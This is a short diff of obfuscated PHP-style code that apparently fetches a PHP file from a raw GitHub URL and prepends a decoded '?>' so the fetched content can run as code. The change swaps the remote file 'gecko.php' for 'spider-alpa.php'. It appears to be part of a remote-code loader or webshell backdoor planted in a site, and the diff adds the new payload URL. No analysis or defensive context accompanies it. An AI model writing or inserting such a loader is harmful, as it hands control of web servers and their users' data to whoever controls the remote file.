@@ -2,7 +2,7 @@
     /_/ urldecode("%3f%3e") .
         file_get_contents(
             /_/ urldecode(
-                /_/ "https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko.php"
+                /_/ "https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/spider-alpa.php"
             )
         )
 ); 
